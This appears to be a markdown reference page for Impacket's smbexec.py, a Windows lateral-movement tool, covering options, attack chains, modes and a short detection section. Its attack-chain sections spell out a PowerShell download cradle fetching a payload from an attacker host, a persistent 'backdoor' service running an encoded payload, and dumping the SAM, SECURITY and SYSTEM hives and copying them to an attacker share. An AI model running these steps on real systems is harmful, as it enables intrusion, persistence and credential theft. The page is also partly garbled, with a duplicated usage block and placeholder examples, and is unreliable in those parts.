# smbexec.py

## Overview
`smbexec.py` is a semi-stealthy remote execution tool in the Impacket suite that provides command execution capabilities without using the traditional RemComSvc service. This tool is categorized under Lateral Movement and provides functionality for executing commands on remote Windows systems through a more subtle approach than traditional psexec methods.

## Detailed Description
`smbexec.py` implements a remote command execution technique that avoids creating the typical RemComSvc service that psexec uses. Instead, it leverages the Service Control Manager (SCM) to create temporary services for command execution. The tool operates in two distinct modes: share mode (using existing writeable shares) and server mode (creating a local SMB server for output retrieval).

The technique was originally described by Optiv and involves creating temporary Windows services that execute commands and redirect output to SMB shares. While this approach may help avoid some antivirus detection compared to traditional psexec, it generates significant Windows event logs and is not considered a stealthy technique.

### Key Features:
- **Service-less Execution**: Doesn't use the RemComSvc service like traditional psexec
- **Dual Mode Operation**: Share mode and server mode for different scenarios
- **Local SMB Server**: Can create local server for output retrieval when no writeable shares exist
- **Multiple Authentication**: Support for password, hash, and Kerberos authentication
- **Shell Options**: Choice between cmd and PowerShell execution environments
- **Temporary Services**: Creates and removes services automatically for command execution

### Technical Details:
- Uses DCE/RPC over SMB for Service Control Manager communication
- Leverages existing shares or creates local SMB server for output redirection
- Creates temporary Windows services for command execution
- Generates significant event logs (EventID 7034, 7035, 7036)
- Process lifecycle managed through Windows service architecture
- Requires administrative privileges on target system

## Command Line Options

```
usage: smbexec.py [-h] [-share SHARE] [-mode {SERVER,SHARE}] [-ts] [-debug] 
                  [-codec CODEC] [-shell-type {cmd,powershell}] [-dc-ip ip address]
                  [-target-ip ip address] [-port {139,445}] [-service-name service_name]
                  [-hashes LMHASH:NTHASH] [-no-pass] [-k] [-aesKey hex key] [-keytab KEYTAB]
                  target

Required Arguments:
  target                [[domain/]username[:password]@]<targetName or address>

Execution Options:
  -share SHARE          Share where the output will be grabbed from (default C$)
  -mode {SERVER,SHARE}  Mode to use (default SHARE, SERVER needs root!)
  -shell-type {cmd,powershell}
                        Choose a command processor for the semi-interactive shell
  -codec CODEC          Sets encoding used from the target's output (default utf-8)
  -service-name SERVICE_NAME
                        The name of the service used to trigger the payload

General Options:
  -ts                   Adds timestamp to every logging output
  -debug                Turn DEBUG output ON

Connection:
  -dc-ip ip address     IP Address of the domain controller
  -target-ip ip address IP Address of the target machine
  -port {139,445}       Destination port to connect to SMB Server (default: 445)

Authentication:
  -hashes LMHASH:NTHASH NTLM hashes, format is LMHASH:NTHASH
  -no-pass              Don't ask for password (useful for -k)
  -k                    Use Kerberos authentication
  -aesKey hex key       AES key to use for Kerberos Authentication (128 or 256 bits)
  -keytab KEYTAB        Read keys for SPN from keytab file
```

## Usage Examples

### Basic Remote Execution
```bash
# Basic execution with password authentication
python3 smbexec.py domain.com/admin:password@192.168.1.100

# Execute with NTLM hash authentication
python3 smbexec.py -hashes :5e884898da28047151d0e56f8dc6292773603d0d domain.com/admin@192.168.1.100

# Using Kerberos authentication
python3 smbexec.py -k domain.com/admin:password@target.domain.com

# Connect to specific IP with NetBIOS name target
python3 smbexec.py -target-ip 192.168.1.100 domain.com/admin:password@WORKSTATION01
```

### Mode Selection
```bash
# Share mode (default) - uses existing writeable share
python3 smbexec.py -mode SHARE -share C$ domain.com/admin:password@192.168.1.100

# Share mode with different share
python3 smbexec.py -mode SHARE -share ADMIN$ domain.com/admin:password@192.168.1.100

# Server mode - creates local SMB server (requires root)
sudo python3 smbexec.py -mode SERVER domain.com/admin:password@192.168.1.100
```

### Shell Type Selection
```bash
# Use Command Prompt (default)
python3 smbexec.py -shell-type cmd domain.com/admin:password@192.168.1.100

# Use PowerShell for execution
python3 smbexec.py -shell-type powershell domain.com/admin:password@192.168.1.100
```

### Advanced Options
```bash
# Custom service name for stealth
python3 smbexec.py -service-name WindowsUpdate domain.com/admin:password@192.168.1.100

# Custom character encoding
python3 smbexec.py -codec cp1252 domain.com/admin:password@192.168.1.100

# Debug mode with timestamps
python3 smbexec.py -debug -ts domain.com/admin:password@192.168.1.100

# Using keytab file
python3 smbexec.py -keytab admin.keytab -k domain.com/admin@target.domain.com
```

```
usage: smbexec.py [-h] [-share SHARE] [-mode {SHARE,SERVER}] [-ts] [-debug] 
                  [-codec CODEC] [-shell-type {cmd,powershell}] [-dc-ip ip address]
                  [-target-ip ip address] [-port [destination port]] 
                  [-service-name service_name] [-hashes LMHASH:NTHASH] [-no-pass] 
                  [-k] [-aesKey hex key] [-keytab KEYTAB] target

Required Arguments:
  target                [[domain/]username[:password]@]<targetName or address>

Optional Arguments:
  -share                Share where output will be grabbed from (default C$)
  -mode                 Mode to use (SHARE or SERVER, default SHARE)
  -ts                   Add timestamp to every logging output
  -debug                Turn DEBUG output ON
  -codec                Sets encoding from target's output (default utf-8)
  -shell-type           Command processor (cmd or powershell)
  -service-name         Name of service used to trigger payload

Connection:
  -dc-ip                IP Address of domain controller
  -target-ip            IP Address of target machine
  -port                 Destination port for SMB Server

Authentication:
  -hashes               NTLM hashes (LM:NT)
  -no-pass              Don't ask for password
  -k                    Use Kerberos authentication
  -aesKey               AES key for Kerberos authentication
  -keytab               Read keys from keytab file
```

## Usage Examples

### Basic Usage
```bash
# Basic command execution
python3 smbexec.py [basic_parameters]

# With authentication
python3 smbexec.py domain.com/user:password@target.domain.com

# Using hash authentication
python3 smbexec.py -hashes :ntlmhash domain.com/user@target.domain.com
```

### Advanced Usage
```bash
# Advanced example 1
python3 smbexec.py [advanced_parameters]

# Advanced example 2
python3 smbexec.py [advanced_parameters_2]

# Debug mode
python3 smbexec.py DOMAIN/user:password@target -debug
```

## Attack Chain Integration

### Lateral Movement via SMB Execution
```bash
# Step 1: Obtain credentials via various methods
python3 secretsdump.py domain.com/user:password@dc.domain.com

# Step 2: Use extracted NTLM hashes for lateral movement
python3 smbexec.py -hashes :extracted_ntlm_hash domain.com/admin@target1.domain.com

# Step 3: Chain execution across multiple systems
python3 smbexec.py -hashes :admin_hash domain.com/admin@target2.domain.com
python3 smbexec.py -hashes :admin_hash domain.com/admin@target3.domain.com
```

### Post-Exploitation Command Execution
```bash
# Step 1: Establish execution on compromised system
python3 smbexec.py domain.com/admin:password@192.168.1.100

# Step 2: Execute post-exploitation commands
C:\> whoami /all
C:\> net localgroup administrators
C:\> wmic process list full
C:\> reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\ProfileList"

# Step 3: Deploy additional tools or payloads
C:\> powershell -exec bypass -c "IEX (New-Object Net.WebClient).DownloadString('http://attacker/payload.ps1')"
```

### Persistence Through Service Creation
```bash
# Step 1: Connect via smbexec
python3 smbexec.py domain.com/admin:password@192.168.1.100

# Step 2: Create persistent service
C:\> sc create backdoor binpath= "cmd.exe /c powershell.exe -enc <base64_payload>" start= auto
C:\> sc start backdoor

# Step 3: Verify persistence mechanism
C:\> sc query backdoor
C:\> tasklist | findstr powershell
```

### Credential Harvesting from Remote System
```bash
# Step 1: Execute on target via smbexec
python3 smbexec.py domain.com/admin:password@192.168.1.100

# Step 2: Extract credentials using various techniques
C:\> reg save hklm\sam C:\temp\sam.hive
C:\> reg save hklm\security C:\temp\security.hive
C:\> reg save hklm\system C:\temp\system.hive

# Step 3: Transfer files back and extract hashes
C:\> copy C:\temp\*.hive \\attacker_ip\share\
# Use secretsdump.py locally on extracted hives
```

### Domain Reconnaissance via SMB Execution
```bash
# Step 1: Execute on domain-joined system
python3 smbexec.py domain.com/user:password@workstation.domain.com

# Step 2: Perform domain enumeration
C:\> net view /domain
C:\> net group "Domain Admins" /domain
C:\> net user /domain
C:\> nltest /dclist:domain.com

# Step 3: Identify high-value targets
C:\> net group "Enterprise Admins" /domain
C:\> net group "Schema Admins" /domain
```

## Operational Modes Explained

### SHARE Mode (Default)
- **Description**: Uses existing writeable SMB shares for output redirection
- **Requirements**: Target must have accessible writeable share (C$, ADMIN$, etc.)
- **Advantages**: No additional network services required
- **Disadvantages**: Limited by available shares and permissions

### SERVER Mode
- **Description**: Creates local SMB server to receive command output
- **Requirements**: Root privileges on attacking machine (port 445)
- **Advantages**: Works when no writeable shares are available
- **Disadvantages**: Creates additional network traffic and requires privileged access

## Technical Implementation Details

### Service Creation Process
1. **Connection**: Establishes SMB connection and authenticates
2. **Service Registration**: Creates temporary service via SCM
3. **Command Execution**: Service executes command with output redirection
4. **Output Retrieval**: Collects output via SMB share or local server
5. **Cleanup**: Removes temporary service and files

### Output Redirection Methods
```bash
# Share mode output redirection
command > \\target\C$\__output_randomstring 2>&1

# Server mode output redirection  
command > \\attacker_ip\TMP\__output_randomstring 2>&1
```

### Event Log Signatures
- **Event ID 7034**: Service terminated unexpectedly
- **Event ID 7035**: Service sent start/stop control
- **Event ID 7036**: Service entered running/stopped state
- **Event ID 4697**: Service installed on system

## Detection and Mitigation

### Detection Methods
```bash
# Monitor for unusual service creation patterns
# Windows Event Log queries:
# EventID 7034 AND ServiceName contains random characters
# EventID 4697 AND ServiceName NOT IN (known_services)

# Network monitoring for SMB patterns:
# Multiple rapid SMB connections
# SMB write operations to admin shares
# Unusual SMB server connections (SERVER mode)
```

### Registry Artifacts
```bash
# Service creation leaves registry artifacts:
# HKLM\SYSTEM\CurrentControlSet\Services\[random_service_name]
# Check for services with unusual names or paths

# File system artifacts:
# Temporary output files in writeable shares
# Look for __output_* files in C$, ADMIN$ shares
```

### Defensive Measures
- **SMB Hardening**: Disable unnecessary SMB shares (C$, ADMIN$)
- **Service Monitoring**: Monitor service creation and execution
- **Network Segmentation**: Limit SMB access between network segments
- **Privilege Management**: Reduce accounts with service creation rights
- **Logging Enhancement**: Increase logging verbosity for service events

## Comparison with Other Execution Methods

### vs. psexec.py
- **psexec**: Uses RemComSvc service, more detectable
- **smbexec**: Creates temporary services, different artifact pattern
- **Detection**: Different event log signatures and file artifacts

### vs. wmiexec.py
- **wmiexec**: Uses WMI for execution, different protocol
- **smbexec**: Uses SCM services, generates service events
- **Stealth**: WMI may be less monitored than service creation

### vs. dcomexec.py
- **dcomexec**: Uses DCOM for execution
- **smbexec**: Uses traditional SMB/SCM approach
- **Compatibility**: SMB works on more systems than DCOM

## Common Issues and Troubleshooting

### Share Access Issues
```bash
# Error: Cannot write to share
# Solution: Check share permissions and try different shares
python3 smbexec.py -share ADMIN$ domain.com/admin:password@target

# Error: Access denied to C$
# Solution: Use administrative shares or SERVER mode
sudo python3 smbexec.py -mode SERVER domain.com/admin:password@target
```

### Service Creation Failures
```bash
# Error: Service creation failed
# Solution: Check user privileges and service name conflicts
python3 smbexec.py -service-name UniqueServiceName domain.com/admin:password@target

# Error: Service already exists
# Solution: Use different service name or cleanup existing services
```

### Character Encoding Issues
```bash
# Error: Garbled output characters
# Solution: Determine target system codepage and specify codec
# On target: chcp.com
# Then use: python3 smbexec.py -codec cp1252 domain.com/admin:password@target
```

### Server Mode Issues
```bash
# Error: Permission denied binding to port 445 (SERVER mode)
# Solution: Run with root privileges
sudo python3 smbexec.py -mode SERVER domain.com/admin:password@target

# Error: Port 445 already in use
# Solution: Stop conflicting services or use SHARE mode
```

## Related Tools
- [psexec.py](psexec.md) - Traditional remote execution via RemComSvc
- [wmiexec.py](wmiexec.md) - Remote execution via WMI
- [dcomexec.py](dcomexec.md) - Remote execution via DCOM
- [atexec.py](atexec.md) - Remote execution via scheduled tasks
- [smbclient.py](smbclient.md) - SMB client for file operations
- [smbserver.py](smbserver.md) - SMB server implementation

---

*This documentation is based on the actual source code and functionality of smbexec.py from Impacket.*
